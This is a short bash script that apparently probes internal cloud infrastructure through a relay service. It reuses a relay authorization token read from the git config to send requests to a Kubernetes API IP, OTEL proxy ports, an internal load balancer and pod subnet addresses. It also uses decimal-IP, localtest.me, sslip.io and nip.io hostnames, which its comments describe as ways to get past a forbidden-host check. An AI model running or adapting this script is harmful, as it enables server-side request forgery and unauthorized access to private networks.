#!/bin/bash
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
echo "[agent_ip] $(hostname -I)"

rp() {
  local label=$1 url=$2; shift 2
  CODE=$(curl -sSo /tmp/rp.bin -w "%{http_code}" --max-time 6 "$@" \
    -H "x-relay-authorization: $JWT" -H "X-Relay-Agent-Pool-ID: $POOL" \
    "https://relay.main.scalr.dev/$url" 2>/tmp/rperr.txt)
  BODY=$(python3 -c "
import gzip
d=open('/tmp/rp.bin','rb').read()
try: d=gzip.decompress(d)
except: pass
print(d.decode('utf-8','replace')[:200])" 2>/dev/null | tr '\n' ' ')
  ERR=$(cat /tmp/rperr.txt | tail -1 | head -c 60)
  echo "[R] $label → $CODE | $BODY | $ERR"
}

# === GKE Kubernetes API (first IP of svc CIDR 10.20.2.0/16 = 10.20.2.1) ===
# k8s API is blocked by hostname but IP might not be in allowed_internal_networks
rp "k8s-api-https" "https://10.20.2.1/"
rp "k8s-api-6443" "https://10.20.2.1:6443/"

# === OTEL proxy (10.30.30.3) — not in scalr main subnet ===
rp "otel-8888" "http://10.30.30.3:8888/metrics"
rp "otel-13133" "http://10.30.30.3:13133/healthz"
rp "otel-4318" "http://10.30.30.3:4318/"

# === Internal LB subnet (10.30.10.0/24) ===
rp "int-lb-http" "http://10.30.10.1/"
rp "int-lb-https" "https://10.30.10.1/"

# === GKE pod network probes (10.101.x.x) ===
MY_IP=$(hostname -I | awk '{print $1}')
MYBASE=$(echo $MY_IP | sed 's/\.[0-9]*$//')
rp "pod-subnet-1" "http://${MYBASE}.1/"
rp "pod-kube-dns" "http://10.20.2.10/"  # kube-dns svc IP

# === DNS bypass patterns (not in FORBIDDEN_HOSTNAMES, resolve to private IPs) ===
# These bypass is_forbidden_host() string check:
# - decimal IP: already blocked by XFF for metadata, but what about other services?
# Decimal for 10.30.0.2 = 169738242
rp "decimal-10.30.0.2" "https://169738242/"  # internal.main.scalr.dev → 10.30.0.2

# localtest.me → 127.0.0.1 (not in forbidden hostnames)
rp "localtest-https" "https://localtest.me/"
rp "localtest-http" "http://localtest.me/"

# sslip.io service: 10.30.0.2.sslip.io → 10.30.0.2 (HTTPS cert included)
rp "sslip-internal-lb" "https://10.30.0.2.sslip.io/"
rp "sslip-otel" "https://10.30.30.3.sslip.io/"

# nip.io variants for RFC1918 (10.x.x.x not in forbidden ranges directly)
rp "nip-10.30.30.3" "https://10.30.30.3.nip.io/"

echo "[done] my_ip=$MY_IP"
